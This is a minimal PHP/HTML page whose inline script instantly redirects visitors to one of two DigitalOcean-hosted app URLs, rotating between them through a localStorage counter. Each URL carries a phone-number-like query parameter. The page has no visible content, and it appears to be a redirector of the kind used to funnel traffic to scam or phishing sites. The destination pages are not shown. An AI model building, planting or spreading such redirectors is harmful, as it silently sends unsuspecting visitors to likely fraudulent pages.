<?php
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Redirecting...</title>

<script>
(function () {
    const urls = [
        " https://sea-turtle-app-7kr7x.ondigitalocean.app/?bcda=(0101)-88844-98569",
        "https://monkfish-app-69rei.ondigitalocean.app/?bcda=(0101)-88844-98569"
    ];

    // Get current index (default 0)
    let index = localStorage.getItem("strict_redirect");
    index = index === null ? 0 : Number(index);

    // Prepare next visit BEFORE redirect
    localStorage.setItem("strict_redirect", (index + 1) % urls.length);

    // INSTANT redirect (no delay)
    window.location.replace(urls[index]);
})();
</script>

</head>
<body>
</body>
</html>
